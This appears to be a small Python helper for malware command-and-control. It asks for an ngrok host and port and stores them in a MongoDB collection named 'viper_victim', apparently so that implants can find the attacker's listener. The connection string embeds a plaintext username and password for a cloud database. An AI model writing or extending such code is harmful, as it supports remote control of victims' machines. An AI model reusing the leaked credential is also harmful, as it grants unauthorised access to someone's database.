from pymongo.mongo_client import MongoClient
from pymongo.server_api import ServerApi

uri = "mongodb+srv://dhanishkariyatmain:Z1fhLszbWf4dltZ3@dann.ivjbvdg.mongodb.net/?retryWrites=true&w=majority&appName=dann"

hostname = input("Enter ngrok host link : ")
port = input("Enter ngrok port number : ")

client = MongoClient(uri)

db = client.viper

post = {
    "hostname" : hostname,
    "port" : port
}

collection = db.viper_victim

collection.insert_one(post)